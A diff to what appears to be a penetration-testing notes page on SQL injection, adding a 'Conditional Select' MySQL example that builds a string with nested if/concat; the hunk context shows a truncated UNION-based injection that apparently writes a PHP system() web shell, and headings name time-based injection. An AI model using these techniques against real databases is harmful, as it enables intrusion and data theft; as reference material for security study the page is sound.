@@ -47,6 +47,14 @@ mysql> select * from users where user_id = 1 union select all 1,2,3,4,"<?php sys
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-19-15-16.png)
 
+### Conditional Select
+
+```sql
+mysql> select * from users where user = (select concat((select if(1>0,'adm','b')),"in"));
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-18-21-39-53.png)
+
 ## Time Based SQL Injection
 
 ### Sleep Invokation
